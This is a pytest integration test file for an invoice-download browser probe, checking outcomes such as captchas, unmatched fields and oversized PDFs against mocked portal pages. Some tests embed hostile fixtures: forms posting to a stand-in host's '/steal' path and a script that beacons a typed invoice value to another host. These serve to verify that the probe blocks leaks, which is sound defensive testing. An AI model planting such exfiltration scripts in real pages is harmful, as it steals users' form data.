"""Integration tests for filling the portal's form once and downloading (D193)."""

from __future__ import annotations

import hashlib
import os
from collections.abc import AsyncIterator
from dataclasses import dataclass, field
from datetime import date
from decimal import Decimal
from pathlib import Path
from urllib.parse import urlsplit

import pytest
import pytest_asyncio
from playwright.async_api import Browser, Page, Request, Route, async_playwright

from invoicebot.config.models import MediaMaxBytes
from invoicebot.fetchers.base import FetchInvoice
from invoicebot.fetchers.browser import probe_form
from invoicebot.fetchers.browser.probe_fill import probe
from invoicebot.fetchers.browser.probe_protocol import ProbeOutcome, ProbeReport, ProbeRequest

_PORTAL = "https://portal.example.test"
_OTHER = "https://other.example.test"
_PDF = b"%PDF-1.4 synthetic pdf bytes"
_XML = b"<?xml version='1.0'?><Invoice/>"
_FIELDS = """
  <label for="tipo">Tipo de Documento</label>
  <select id="tipo" name="tipo"><option>Seleccione</option><option>FACTURA ELECTRONICA</option></select>
  <label for="serie">Serie</label><input id="serie" name="serie" />
  <label for="numero">N° Correlativo</label><input id="numero" name="numero" />
  <label for="fecha">Fecha de Emisión</label><input id="fecha" name="fecha" type="date" />
  <label for="total">Monto Total</label><input id="total" name="total" />
  <button id="buscar" type="submit">Buscar</button>
"""
_LINKS = '<a id="pdf" href="/doc.pdf">Descargar PDF</a><a id="xml" href="/doc.xml">Descargar XML</a>'
_INVOICE_VALUES = ("20123456789", "F001", "118.50", "2026-11-05", "05/11/2026")


def _form(action: str = "/buscar", extra: str = "", method: str = "post") -> str:
    form = f'<form method="{method}" action="{action}">{_FIELDS}{extra}</form>'
    return f"<!doctype html><html><body>{form}</body></html>"


def _invoice() -> FetchInvoice:
    return FetchInvoice(
        ruc_emisor="20123456789",
        tipo="01",
        serie="F001",
        numero="123",
        fecha=date(2026, 11, 5),
        total=Decimal("118.5"),
    )


@dataclass
class _Seen:
    """Every request the portal and the other host received (D193)."""

    portal: list[Request] = field(default_factory=list)
    other: list[Request] = field(default_factory=list)

    def posts(self) -> list[Request]:
        return [r for r in self.portal if r.method == "POST"]

    def leaked(self) -> bool:
        """Whether any invoice value traveled in a URL (bodies are checked by posts())."""
        return any(
            value in r.url for r in [*self.portal, *self.other] for value in ("F001", "118.5", "20123456789")
        )


@pytest_asyncio.fixture(scope="module", loop_scope="session")
async def browser() -> AsyncIterator[Browser]:
    """A headless Chromium for this module's tests."""
    async with async_playwright() as playwright:
        launched = await playwright.chromium.launch()
        yield launched
        await launched.close()


@pytest_asyncio.fixture(loop_scope="session")
async def page(browser: Browser) -> AsyncIterator[Page]:
    """A fresh page with downloads enabled and a short timeout."""
    fresh = await browser.new_page(accept_downloads=True)
    fresh.set_default_timeout(3000)
    yield fresh
    await fresh.close()


@pytest.fixture(autouse=True)
def _short_settle(monkeypatch: pytest.MonkeyPatch) -> None:
    """D193: shorten the settle window."""
    monkeypatch.setattr(probe_form, "SETTLE_MS", 300)


async def _serve(page: Page, form: str, result: str, pdf: bytes = _PDF) -> _Seen:
    """Serve the form at /consulta, the result at POST /buscar and two downloads (D193)."""
    seen = _Seen()

    async def portal(route: Route) -> None:
        seen.portal.append(route.request)
        path = urlsplit(route.request.url).path
        files = {"/doc.pdf": (pdf, "doc.pdf"), "/doc.xml": (_XML, "doc.xml")}
        if path in files:
            body, name = files[path]
            headers = {"Content-Disposition": f'attachment; filename="{name}"'}
            await route.fulfill(body=body, headers=headers, content_type="application/octet-stream")
        elif path == "/consulta":
            await route.fulfill(body=form, content_type="text/html; charset=utf-8")
        else:
            await route.fulfill(body=result, content_type="text/html; charset=utf-8")

    async def other(route: Route) -> None:
        seen.other.append(route.request)
        await route.fulfill(body="elsewhere", content_type="text/html")

    await page.route(f"{_PORTAL}/**", portal)
    await page.route(f"{_OTHER}/**", other)
    return seen


def _request(tmp_path: Path, max_pdf: int = 10_000) -> ProbeRequest:
    return ProbeRequest(
        url=f"{_PORTAL}/consulta",
        invoice=_invoice(),
        out_dir=tmp_path,
        max_bytes=MediaMaxBytes(image=1000, pdf=max_pdf, xml=10_000, zip=1000),
        page_timeout_ms=1500,
    )


def _clean(report: ProbeReport) -> None:
    dumped = report.model_dump_json()
    for value in _INVOICE_VALUES:
        assert value not in dumped


@pytest.mark.asyncio(loop_scope="session")
async def test_pdf_and_xml_are_saved_with_their_hashes(page: Page, tmp_path: Path) -> None:
    """D193: both links give two files whose hashes match the served bytes."""
    seen = await _serve(page, _form(), f"<html><body>{_LINKS}</body></html>")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.OK
    assert {f.kind: f.sha256 for f in report.files} == {
        "pdf": hashlib.sha256(_PDF).hexdigest(),
        "xml": hashlib.sha256(_XML).hexdigest(),
    }
    assert (report.pdf, report.xml) == ("#pdf", "#xml")
    assert len(seen.posts()) == 1
    assert not seen.leaked()
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_only_a_pdf_is_ok_with_one_file(page: Page, tmp_path: Path) -> None:
    """D193: a result with only a PDF link is ok with one file."""
    seen = await _serve(page, _form(), '<html><body><a id="pdf" href="/doc.pdf">PDF</a></body></html>')

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.OK
    assert [f.kind for f in report.files] == ["pdf"]
    assert len(seen.posts()) == 1
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_not_found_text_is_not_found(page: Page, tmp_path: Path) -> None:
    """D193: the portal's not-found text ends as not_found with no files."""
    seen = await _serve(page, _form(), "<html><body><p>El comprobante NO SE ENCONTRÓ</p></body></html>")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.NOT_FOUND
    assert report.files == ()
    assert len(seen.posts()) == 1
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_a_page_with_nothing_is_no_download(page: Page, tmp_path: Path) -> None:
    """D193: a result with no link and no text is no_download."""
    seen = await _serve(page, _form(), "<html><body><p>Gracias</p></body></html>")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.NO_DOWNLOAD
    assert len(seen.posts()) == 1
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_an_image_captcha_stops_before_typing(page: Page, tmp_path: Path) -> None:
    """D193: a captcha is reported, nothing is typed or posted."""
    seen = await _serve(page, _form(extra='<img id="captcha-image" src="/c.png" />'), "")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.CAPTCHA
    assert report.captcha == "image"
    assert seen.posts() == []
    assert not seen.leaked()
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_an_unmatched_required_field_stops_before_typing(page: Page, tmp_path: Path) -> None:
    """D193: a required field we cannot fill is unmatched_field and nothing is posted."""
    seen = await _serve(
        page, _form(extra='<label for="x">Otro</label><input id="x" name="x" required />'), ""
    )

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.UNMATCHED_FIELD
    assert report.stopped_at == "Otro"
    assert seen.posts() == []
    assert not seen.leaked()
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_a_required_textarea_names_its_label(page: Page, tmp_path: Path) -> None:
    """BR-S06, D193: a required textarea stops the probe as unmatched_field named by its label."""
    extra = '<label for="nota">Comentario</label><textarea id="nota" name="nota" required></textarea>'
    seen = await _serve(page, _form(extra=extra), "")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.UNMATCHED_FIELD
    assert report.stopped_at == "Comentario"
    assert seen.posts() == []
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_a_tipo_text_input_names_its_label(page: Page, tmp_path: Path) -> None:
    """BR-S06, D193: a tipo the probe cannot type stops it as unmatched_field named by its label."""
    tipo_select = _FIELDS.split("\n")[2]
    fields = _FIELDS.replace(tipo_select, '  <input id="tipo" name="tipo" />')
    html = f'<!doctype html><html><body><form method="post" action="/buscar">{fields}</form></body></html>'
    seen = await _serve(page, html, "")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.UNMATCHED_FIELD
    assert report.stopped_at == "Tipo de Documento"
    assert seen.posts() == []
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_a_form_without_a_submit_is_no_submit(page: Page, tmp_path: Path) -> None:
    """BR-S06, D193: a form with no submit control the probe can name is no_submit, nothing typed."""
    fields = _FIELDS.replace('<button id="buscar" type="submit">Buscar</button>', "")
    html = f'<!doctype html><html><body><form method="post" action="/buscar">{fields}</form></body></html>'
    seen = await _serve(page, html, "")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.NO_SUBMIT
    assert report.stopped_at is None
    assert seen.posts() == []
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_a_form_posting_to_another_host_sends_nothing(page: Page, tmp_path: Path) -> None:
    """D193: a non-GET request to another host is aborted, so nothing reaches it."""
    seen = await _serve(page, _form(action=f"{_OTHER}/steal"), "")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.NO_DOWNLOAD
    assert seen.other == []
    assert seen.posts() == []
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_a_get_form_to_another_host_sends_nothing(page: Page, tmp_path: Path) -> None:
    """D193: once values are typed, a GET to another host is aborted too, so no value leaves in its URL."""
    seen = await _serve(page, _form(action=f"{_OTHER}/steal", method="get"), "")

    report = await probe(page, _request(tmp_path))

    assert report.outcome is ProbeOutcome.NO_DOWNLOAD
    assert seen.other == []
    assert not seen.leaked()
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_page_script_sending_a_value_to_another_host_is_aborted(page: Page, tmp_path: Path) -> None:
    """D193: a script that copies a typed value into a request to another host reaches nothing."""
    beacon = (
        "<script>document.addEventListener('submit', () => {"
        f"new Image().src = '{_OTHER}/b?v=' + document.getElementById('serie').value;"
        "}, true);</script>"
    )
    seen = await _serve(page, _form(extra=beacon), "<html><body>nada</body></html>")

    report = await probe(page, _request(tmp_path))

    assert seen.other == []
    assert not seen.leaked()
    _clean(report)


@pytest.mark.asyncio(loop_scope="session")
async def test_a_pdf_over_the_limit_is_technical_and_leaves_no_file(page: Page, tmp_path: Path) -> None:
    """D193: a PDF over max_bytes is technical and out_dir stays empty."""
    seen = await _serve(page, _form(), f"<html><body>{_LINKS}</body></html>")

    report = await probe(page, _request(tmp_path, max_pdf=5))

    assert report.outcome is ProbeOutcome.TECHNICAL
    assert report.files == ()
    assert not any(True for _ in os.scandir(tmp_path))
    assert len(seen.posts()) == 1
    _clean(report)
